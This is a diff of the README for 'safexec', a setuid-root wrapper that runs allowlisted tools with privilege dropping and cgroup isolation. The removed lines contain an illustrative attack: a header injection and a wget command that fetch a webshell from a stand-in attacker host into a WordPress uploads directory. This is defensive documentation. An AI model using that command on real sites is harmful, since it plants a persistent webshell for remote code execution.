@@ -1,215 +1,239 @@
 # safexec
 
-A small, allowlist-only, privilege-dropping `exec()` wrapper for running a
-fixed set of external tools safely from a privileged or semi-privileged
-caller — typically `shell_exec()`/`exec()`/`proc_open()` in PHP.
+`safexec` runs a fixed set of command-line tools on behalf of a less-trusted
+caller. It is installed setuid root. It checks the request against a
+compile-time allowlist, pins the tool to a trusted absolute path, scrubs the
+environment, places the process in its own cgroup v2 group, drops privileges,
+and then `exec`s the tool. It never starts a shell and never runs a tool as root.
 
-It was originally written as the execution backend for the **NPP (Nginx
-Cache Purge Preload)** WordPress plugin, but the allowlist, isolation and
-privilege-drop logic are entirely generic — `safexec` is useful anywhere
-you need to run a small set of known binaries from a web app, cron job, or
-service account without exposing a shell or arbitrary PATH lookups.
+Typical callers are web applications, schedulers, and job runners that must
+invoke tools such as `curl`, `tar`, or `ffmpeg` without a shell and without
+inheriting the caller's environment or file descriptors.
 
-## Why
-
-Calling `shell_exec("wget " . $input)` or similar from an application
-means:
-
-- if the command is built as a string and any part of it is
-  attacker-influenced, it can break out of the intended argument and run
-  arbitrary shell commands,
-- the child inherits the caller's environment, open file descriptors,
-  PATH, and resource limits,
-- there is no cgroup/rlimit isolation, and
-- there's no controlled way to later locate and terminate the process.
-
-`safexec` addresses the last three — **when installed setuid-root** — by acting as a thin gatekeeper: it validates the request against a fixed allowlist, resolves the target binary to a trusted absolute path, sanitizes the environment, closes inherited file descriptors, drops privileges, and moves the process into its own cgroup v2 leaf (or applies POSIX rlimits as a fallback) before executing. 
-
-By default, this isolation step groups and tracks the process for lifecycle control (e.g. --kill) rather than capping its CPU/memory/IO usage — actual resource ceilings require editing nppp_default_limits() at compile time. It also never invokes a shell itself, and rejects shell interpreters outright — which closes the first problem too, but only when the caller invokes `safexec` with an argument vector rather than a shell string; `safexec` cannot undo an injection that already happened in a `/bin/sh -c "..."` the caller built before calling it.
-
-### Illustrative attack scenario
- 
-This is a generic `shell_exec()`-with-attacker-influenced-input pattern,
-it's representative of the class of
-bug `safexec` is designed to contain.
- 
-```sh
-# Attacker injects a request header and triggers an endpoint that
-# shells out based on it
-curl -H "Referer: http://attacker.com/shell.php" https://example.com/preload-endpoint
- 
-# Vulnerable PHP code uses the header value directly in shell_exec(),
-# e.g. shell_exec("wget " . $_SERVER['HTTP_REFERER'] . " -O ...")
-```
- 
-**Without safexec**, the resulting command runs as the PHP-FPM worker, which is typically also the *owner* of
-`wp-content/uploads/` (directory mode 755 — writable by its owner):
- 
-```sh
-wget http://attacker.com/shell.php \
-  -O /var/www/html/wp-content/uploads/shell.php
- 
-# → shell.php is written to a web-accessible path: persistent webshell (RCE)
-```
- 
-**With safexec**, the same call is wrapped:
- 
-```sh
-safexec wget http://attacker.com/shell.php \
-  -O /var/www/html/wp-content/uploads/shell.php
- 
-Info: pinned tool 'wget' -> '/usr/bin/wget'
-Info: using cgroup v2 child /sys/fs/cgroup/nppp/nppp.1397159
-Info: Injected: LD_PRELOAD=/usr/lib/npp/libnpp_norm.so PCTNORM_CASE=upper (prog=wget)
-Summary: user=65534:65534 (ruid=65534 rgid=65534) cwd=/var/www/ tool=/usr/bin/wget
-Summary: no_new_privs=on
-Summary: cgroup=/sys/fs/cgroup/nppp/nppp.1397159
- 
-/var/www/html/wp-content/uploads/shell.php: Permission denied
-```
- 
-`safexec` drops the child to `nobody` before `execvp()`.
-`nobody` is neither the owner nor group of `uploads/`, so the write that
-previously succeeded via the owner bit now fails via the "other"
-permission bits, and the webshell never lands. (That final
-`Permission denied` line comes from `wget` itself, since by that point
-`safexec` has already `execvp()`'d into it.)
-
-## Allowlisted binaries
-
-Built in by default:
-
-| Category   | Binaries |
-|------------|----------|
-| Search     | `rg` |
-| Fetch      | `wget`, `curl` |
-| Archives   | `tar`, `gzip`, `gunzip`, `xz`, `unxz`, `zip`, `unzip` |
-| Checksums  | `sha256sum`, `sha512sum`, `shasum`, `b2sum`, `cksum` |
-| Media      | `ffmpeg`, `ffprobe`, `magick`, `convert`, `identify` |
-| Documents  | `wkhtmltopdf`, `pdftk`, `pandoc` |
-
-Optional, compile-time only (off by default — see [Build](#build)):
-
-| Flag | Adds |
-|------|------|
-| `-DSAFEXEC_WITH_GS` | `gs` (Ghostscript — historically prone to PS/PDF-driven sandbox escapes; enable only if you need it) |
-| `-DSAFEXEC_WITH_POPPLER` | `pdfinfo`, `pdftoppm`, `pdftocairo` |
-| `-DSAFEXEC_WITH_DB` | `mysqldump`, `mysql`, `mariadb-dump`, `mariadb`, `pg_dump`, `pg_restore`, `psql`, `redis-cli` |
-| `-DSAFEXEC_WITH_RSYNC_GIT` | `rsync`, `git` (both can shell out over SSH — enable only if you control their invocation) |
-
-## Usage
+## Synopsis
 
 ```
-safexec <program> [args...]
+safexec [wrapper ...] <tool> [args ...]
 safexec --kill=<pid>
 safexec --help | -h
 safexec --version | -v
 ```
 
+## Description
+
+`safexec` processes a request in four steps.
+
+1. **Allowlist.** The tool is matched by basename against the allowlist.
+   Shells (`sh`, `bash`, `dash`, `ash`, `zsh`, `ksh`, `fish`) are rejected in
+   the prelude. Anything not on the list is refused.
+2. **Pinning.** The tool and every bare-name wrapper are resolved to absolute
+   paths under trusted directories. The caller's `PATH` and working directory
+   are never consulted.
+3. **Isolation.** With effective uid 0, the environment is cleared, the process
+   joins a fresh cgroup v2 group (or falls back to rlimits), and the process
+   state is hardened (see [Privileged mode](#privileged-mode)).
+4. **Drop and exec.** Privileges are dropped, `PR_SET_NO_NEW_PRIVS` is set,
+   inherited descriptors are closed, and the tool is executed.
+
+There is no shell in the exec path. Characters such as `;`, `|` and `` ` ``
+inside an argument reach the tool literally.
+
+### Privileged mode
+
+Applies whenever the effective uid is 0, that is, when the binary is setuid
+root or is run by root. In order:
+
+- the environment is cleared; `PATH` is set to a fixed value and a UTF-8
+  locale is set (`C.UTF-8`, then `en_US.UTF-8`, then `C`)
+- `umask` is set to `077` and `PR_SET_DUMPABLE` to `0`
+- the process joins `<cgroup root>/safexec-run/safexec-run.<pid>`; if cgroup v2
+  is unavailable it falls back to rlimits
+- supplementary groups are cleared and the uid/gid are set to `nobody`
+  (or to the directory owner for `rg`, see below)
+- `PR_SET_NO_NEW_PRIVS` is set and all file descriptors above 2 are closed
+- the tool is executed
+
+If the drop to the target user fails, `safexec` falls back to the invoking
+user's real uid/gid. If the effective uid is still 0 after that, it aborts.
+
+### Pass-through mode
+
+If the effective uid is not 0 (no setuid bit, `nosuid` mount, or the binary was
+copied without its mode), only the allowlist and path pinning apply. The
+environment is not sanitized, privileges are not dropped, and no isolation is
+set up. The tool runs as the invoking user. A notice is printed to stderr.
+
+## Allowlisted programs
+
+Always available:
+
+| Group     | Programs                                                  |
+|-----------|-----------------------------------------------------------|
+| Search    | `rg`                                                      |
+| Fetch     | `wget`, `curl`                                            |
+| Archives  | `tar`, `gzip`, `gunzip`, `xz`, `unxz`, `zip`, `unzip`     |
+| Checksums | `sha256sum`, `sha512sum`, `shasum`, `b2sum`, `cksum`      |
+| Media     | `ffmpeg`, `ffprobe`, `magick`, `convert`, `identify`      |
+| Documents | `wkhtmltopdf`, `pdftk`, `pandoc`                          |
+
+Optional groups, enabled at compile time (see [Build](#build)):
+
+| Macro                      | Adds                                                                                     |
+|----------------------------|------------------------------------------------------------------------------------------|
+| `SAFEXEC_WITH_GS`          | `gs`                                                                                     |
+| `SAFEXEC_WITH_POPPLER`     | `pdfinfo`, `pdftoppm`, `pdftocairo`                                                      |
+| `SAFEXEC_WITH_DB`          | `mysqldump`, `mysql`, `mariadb-dump`, `mariadb`, `pg_dump`, `pg_restore`, `psql`, `redis-cli` |
+| `SAFEXEC_WITH_RSYNC_GIT`   | `rsync`, `git`                                                                           |
+
+`gs` has a long history of sandbox-escape vulnerabilities. `rsync` and `git`
+can start `ssh`, which is outside the closed set of tools the allowlist assumes.
+Enable these groups only if you control how the tools are invoked.
+
+A tool that is on the allowlist but not installed is refused with
+`cannot resolve trusted path`. On Debian, `pg_dump`, `pg_restore` and `psql`
+are symlinks to `/usr/share/postgresql-common/pg_wrapper`, which is outside the
+trusted directories, so they are refused there.
+
+## Prelude
+
+Tokens before the tool name form the prelude. Each token must be one of:
+
+- **A wrapper:** `nohup`, `nice`, `timeout`, `stdbuf`, `ionice`, `taskset`,
+  `setsid`, `chrt`, `time`. A bare name is pinned like the tool. An explicit
+  path must be exactly `<trusted directory>/<name>`; `..` and extra path
+  components are rejected.
+- **An option:** a token starting with `-`, or `--`. An option containing a `/`
+  is rejected, so `timeout 5 -dir/prog` cannot smuggle a path.
+- **A number or value:** a signed integer, a duration (`5`, `1.5`, `2m`), a CPU
+  mask (`0x3`, `0,1`, `0-3`).
+- **A proxy assignment:** `NAME=VALUE` where `NAME` is `HTTP_PROXY`,
+  `HTTPS_PROXY`, `ALL_PROXY`, `NO_PROXY` or the lowercase form. At most 16 are
+  accepted. They are removed from `argv` and exported to the tool.
+
+Any other assignment (`PATH=`, `LD_*`, `DYLD_*`, `IFS=`, `PYTHONPATH=`, ...) is
+rejected. Wrapper options that take a separate value word are not recognized:
+write `timeout -sKILL 20`, not `timeout -s KILL 20`.
+
+## Examples
+
 ```sh
-# Basic fetch, run through the allowlist and privilege-drop path
-safexec wget -q -O /tmp/out.html https://example.com/
+# Fetch through the allowlist
+safexec curl -fsS -o /var/tmp/page.html https://example.com/
 
-# Wrapper chaining
-safexec nice -n 10 timeout 30 curl -fsSL https://example.com/ -o /tmp/out
+# Wrapper chain and a proxy variable
+safexec HTTP_PROXY=http://127.0.0.1:3128 nice -n 10 timeout 30 curl -fsSL https://example.com/
 
-# Terminate a safexec-spawned, nobody-owned process
-safexec --kill=12345
+# Checksum
+safexec sha256sum /srv/data/archive.tar.gz
+
+# Refused: not on the allowlist
+safexec ls /
+# Error: 'ls' is not allowed by safexec.
+
+# Refused: shell in the prelude
+safexec /bin/sh -c id
+# Info: rejecting shell interpreter before tool: '/bin/sh'
+# Error: 'sh' is not allowed by safexec.
 ```
 
-Any binary not in the allowlist, or any attempt to run a shell as a
-"wrapper", is rejected before privilege-sensitive code runs:
+In privileged mode, diagnostics go to stderr:
 
 ```
-$ safexec /bin/sh -c 'id'
-Info: rejecting shell interpreter before tool: '/bin/sh'
-Error: 'sh' is not allowed by safexec.
+Info: pinned tool 'sha256sum' -> '/usr/bin/sha256sum'
+Info: using cgroup v2 child /sys/fs/cgroup/safexec-run/safexec-run.<pid>
+Summary: user=65534:65534 (ruid=65534 rgid=65534) cwd=... tool=/usr/bin/sha256sum
+Summary: no_new_privs=on
+Summary: cgroup=/sys/fs/cgroup/safexec-run/safexec-run.<pid>
 ```
 
-### `rg` and directory ownership
- 
-`rg` (ripgrep) is treated specially: instead of dropping to `nobody`,
-`safexec` `lstat()`s the last argument (expected to be an absolute
-directory path) and drops to *that path's owning user* before executing
-the search. Root-owned or symlinked target paths are refused.
- 
-The general principle: this mechanism earns its keep whenever the
-identity a search needs is structurally different from, and unknown in
-advance to, the caller's own fixed or known identity — a fixed `nobody`
-drop can't read arbitrary per-tenant/per-service directories, and running
-as root would defeat the point of dropping privileges at all. Resolving
-the drop-UID from the target directory's owner at call time gives the
-search exactly that owner's permissions, no more, no less, without
-hardcoding who that owner is. (The original motivating case — an Nginx
-cache directory owned by a different user than the calling PHP-FPM worker
-— is just one instance of this.)
+Set `SAFEXEC_QUIET=1` to suppress them.
 
-## Environment variables
+## Tool-specific behavior
 
-| Variable | Values | Default | Effect |
-|---|---|---|---|
-| `SAFEXEC_DETACH` | `auto`, `cgv2`, `rlimits`, `off` | `auto` | Isolation strategy. `auto` prefers cgroup v2 and falls back to rlimits. Read via `secure_getenv()` on glibc. |
-| `SAFEXEC_QUIET` | `0`/`1` | `0` | Suppress informational/summary output on stderr. |
-| `SAFEXEC_SAFE_CWD` | `-1`, `0`, `1` | `-1` | If the CWD isn't writable, `chdir("/tmp")` (falls back to `/`). `-1` enables this only when a TTY is attached to stdio. |
-| `SAFEXEC_PCTNORM` | `0`/`1` | `1` | Enable/disable injecting the `libnpp_norm.so` `LD_PRELOAD` shim for `wget`/`curl`. |
-| `SAFEXEC_PCTNORM_SO` | path | `/usr/lib/npp/libnpp_norm.so` | Path to the shim. Only used if it passes [`is_secure_so()`](#pctnorm-shim) validation. |
-| `SAFEXEC_PCTNORM_CASE` | `upper`, `lower`, `off` | `upper` | Forwarded to the shim as `PCTNORM_CASE`. |
+### rg
 
-Proxy variables `HTTP_PROXY`, `HTTPS_PROXY`, `ALL_PROXY`, `NO_PROXY` (and
-lowercase forms) may be passed as `NAME=value` tokens before the target
-binary and are preserved through environment sanitization; all other
-assignments are rejected.
+The last argument must be an absolute path to a directory. It must not be a
+symlink and must not be owned by root. `rg` runs as the owner of that
+directory, so it can read exactly what that user can read. If the owner is
+already the invoking user, no drop is performed. A relative or missing path, a
+non-directory, a symlink, a root-owned directory, or an owner absent from the
+passwd database is refused with exit status 3.
 
-## `libnpp_norm.so`
+```sh
+safexec rg -m 1 --text 'pattern' /home/alice/project
+```
 
-An optional `LD_PRELOAD` shared object that rewrites the hex-digit case of
-`%xx` percent-encoded sequences in the *request-target* of the first
-outgoing HTTP request line, for `wget`/`curl` only. This is useful when a
-reverse-proxy cache treats differently-cased but otherwise identical
-percent-encodings as distinct cache keys.
+### wget
 
-`safexec` will only inject this shim (via `LD_PRELOAD`) if the resolved
-`.so`:
+If `-P /tmp` is given and `/tmp` is not writable by the final user, it is
+rewritten to `/tmp/safexec-work/<uid>`. `/tmp/safexec-work` is root-owned with
+mode `1777`; the per-user subdirectory has mode `0700`.
 
-- is a regular file owned by `root:root`,
-- is not group- or other-writable,
-- resolves (via `realpath`) under one of `/usr/lib`, `/lib`, `/usr/lib64`,
-  `/lib64`, and
-- has the exact basename `libnpp_norm.so`.
+## --kill
 
-Otherwise it silently skips injection and logs why (unless `SAFEXEC_QUIET=1`).
+```
+safexec --kill=<pid>
+```
+
+Sends `SIGTERM` to a process that `safexec` started. The target must:
+
+- be owned by `nobody`, and
+- be in a `safexec-run` cgroup, or, when cgroup delegation is unavailable,
+  have `NoNewPrivs` set.
+
+The signal is sent with `pidfd_send_signal` where available, otherwise with
+`kill(2)`. Because `nobody`-owned processes can only be signalled by a
+privileged sender, use it through the setuid binary. Linux only.
+
+## Exit status
+
+| Status        | Meaning                                                                       |
+|---------------|-------------------------------------------------------------------------------|
+| tool's status | `safexec` replaces itself with the tool, so its status is returned unchanged |
+| 3             | Refused or failed before exec: usage, not allowed, unresolvable path, rejected prelude |
+| `--kill`      | 0 on success, 1 otherwise                                                     |
+
+Status 3 is also a valid exit status of some tools, so callers that need to
+distinguish the two should also inspect stderr.
+
+## Environment
+
+These are read before the environment is cleared.
+
+| Variable            | Values                              | Default | Effect |
+|---------------------|-------------------------------------|---------|--------|
+| `SAFEXEC_DETACH`    | `auto`, `cgv2`, `rlimits`, `off`    | `auto`  | Isolation mode. `auto` uses cgroup v2 and falls back to rlimits. Read with `secure_getenv()` on glibc, so it is ignored when an unprivileged user runs the setuid binary. |
+| `SAFEXEC_QUIET`     | `0`, `1`                            | `0`     | Suppress informational messages on stderr. |
+| `SAFEXEC_SAFE_CWD`  | `-1`, `0`, `1`                      | `-1`    | If the working directory is not writable, change to `/tmp` (or `/`). `-1` does this only when stdio is attached to a terminal. |
+
+Compile-time defaults: `-DSAFEXEC_QUIET_DEFAULT=0|1`,
+`-DSAFEXEC_SAFE_CWD_DEFAULT=-1|0|1`.
+
+Isolation groups and tracks the process; by default it does not cap CPU,
+memory or I/O. Resource ceilings are set in `safexec_default_limits()` in
+`safexec.c` and take effect after rebuilding.
 
 ## Build
 
-```sh
-make                 # build ./build/safexec
-make norm            # build ./build/libnpp_norm.so (opt-in, not part of `all`)
-make check           # run tests/run.sh against the built binary
-```
-
-Standard override variables are respected: `CC`, `CFLAGS`, `CPPFLAGS`,
-`LDFLAGS`, `DESTDIR`, `PREFIX` (default `/usr/local`; installs to
-`$(PREFIX)/sbin`). No static linking or specific compiler is forced by
-default.
-
-Enable optional tool buckets at build time:
+Requirements: a C compiler and `make`. Linux is fully supported. Other POSIX
+systems get the allowlist, pinning, rlimits and descriptor closing, without
+cgroups, `pidfd` or `--kill`.
 
 ```sh
-make EXTRA_CPPFLAGS="-DSAFEXEC_WITH_POPPLER -DSAFEXEC_WITH_DB -DSAFEXEC_WITH_RSYNC_GIT"
+make                                  # build/safexec
+make EXTRA_CPPFLAGS="-DSAFEXEC_WITH_POPPLER -DSAFEXEC_WITH_DB"
+make clean
 ```
 
-Static, musl-based release builds (require `zig cc` or an equivalent musl
-cross toolchain):
+`CC`, `CFLAGS`, `CPPFLAGS`, `LDFLAGS`, `PREFIX` and `DESTDIR` are honored.
+The default flags build a PIE with stack protector, RELRO, `-z now`, and
+CET (x86) or BTI/PAC (aarch64) where available.
+
+Static musl builds require `zig cc`:
 
 ```sh
 make static            # build/safexec-x86_64-linux-musl
 make static-aarch64    # build/safexec-aarch64-linux-musl
-```
-
-Build the pctnorm shim in wget-only fast-path mode:
-
-```sh
-make norm EXTRA_NORM_CPPFLAGS=-DWGET_FASTPATH
 ```
 
 ## Install
@@ -217,55 +241,51 @@ make norm EXTRA_NORM_CPPFLAGS=-DWGET_FASTPATH
 ```sh
 sudo make install
 sudo chown root:root /usr/local/sbin/safexec
-sudo chmod 4755 /usr/local/sbin/safexec   # setuid-root; avoid nosuid mounts
+sudo chmod 4755 /usr/local/sbin/safexec
 ```
 
-Without the setuid bit, `safexec` runs in pass-through mode (allowlist and
-path-pinning only, no privilege drop or isolation).
-
-To install the optional pctnorm shim:
-
-```sh
-sudo make install-norm            # installs to $(NPP_LIBDIR), default /usr/lib
-```
-
-`NPP_LIBDIR` must resolve under one of the trusted lib roots hardcoded in
-`safexec.c` (`/usr/lib`, `/lib`, `/usr/lib64`, `/lib64`) — installing
-elsewhere, including under a custom `PREFIX`, causes `safexec` to silently
-skip `LD_PRELOAD` injection.
+`make install` installs the binary to `$(PREFIX)/sbin` and the manual page to
+`$(PREFIX)/share/man/man1`. Do not install on a `nosuid` mount. To limit who
+can invoke the binary, use mode `4750` with a dedicated group.
 
 ```sh
 sudo make uninstall
 ```
 
-## `--kill=<pid>`
+## Tests
 
-Sends `SIGTERM` (via `pidfd_send_signal` where available, falling back to
-`kill(2)`) to a PID, but only if:
+```sh
+make check
+```
 
-- the PID's owning UID matches `nobody`, **and**
-- the PID resides in a `safexec`-created `nppp.*` cgroup v2 leaf under
-  `/sys/fs/cgroup/nppp` — or, if cgroup delegation isn't available in the
-  current namespace, the target process has `NoNewPrivs` set (a
-  kernel-enforced, one-way flag `safexec` itself sets before `exec`).
+Runs `tests/run.sh` against `build/safexec`: argument handling, allowlist and
+prelude rejection, path pinning, and basic execution. The privilege-drop test
+runs only when the tests are run as root against a setuid-root binary;
+otherwise it is skipped.
 
-This is intentionally narrow: it lets a caller reap runaway children it
-spawned via `safexec`, without granting a general-purpose kill capability.
-Sending the signal is still subject to normal `kill(2)` permission rules
-(matching UID or `CAP_KILL`) — in practice, killing a `nobody`-owned
-target requires running `--kill` from the setuid-root binary itself.
+The full end-to-end suite builds a default and a full-bucket binary, runs the
+parser fuzzer (400,000 iterations per run, plus an ASan/UBSan build), installs
+setuid binaries, and exercises every allowlisted tool, privilege dropping,
+environment scrubbing, `rg` owner-drop, `--kill`, the `wget` fallback, and
+concurrency.
 
-## Limitations
+```sh
+SAFEXEC_TEST_CONTAINER=1 bash tests/run-all.sh
+```
 
-- Allowlist-only, with no shell in the exec path: characters like `;`,
-  `|`, or `` ` `` inside an argument are passed through literally to
-  `execvp()` and never interpreted as shell syntax. This does not protect
-  a caller that itself builds a shell string and hands that string to a
-  shell before ever reaching `safexec` — the argument vector has to arrive
-  unshelled for this guarantee to hold.
-- Not a syscall sandbox — no seccomp filtering; isolation is limited to
-  cgroups/rlimits on the child's resource usage.
-- `--kill` and cgroup isolation are Linux-only; other POSIX platforms get
-  rlimit-based isolation and no `--kill` support.
-- Static binaries elsewhere on the system are unaffected by
-  `LD_PRELOAD`-based normalization (`libnpp_norm.so`), by design.
+**This suite modifies the host.** It installs packages with `apt-get`, creates
+the users `tester` and `alice`, writes under `/srv` and `/home`, and installs
+setuid-root binaries in `/usr/local/bin`. It refuses to run unless
+`SAFEXEC_TEST_CONTAINER=1` is set and the effective uid is 0. Run it only in a
+disposable container or VM with a writable cgroup v2 hierarchy, for example
+`docker run --privileged --cgroupns=host --init ubuntu:24.04`.
+
+| Variable           | Default                       | Meaning                          |
+|--------------------|-------------------------------|----------------------------------|
+| `SXTEST_RESULTS`   | `/tmp/safexec-test-results`   | Directory for logs               |
+| `FUZZ_RUNS`        | `3`                           | Parser-fuzz repetitions          |
+
+The exit status is non-zero if any stage (deps, build, fuzz, fixtures, smoke,
+functional) fails. CI runs the same suite (`.github/workflows/tests.yml`).
+
+##
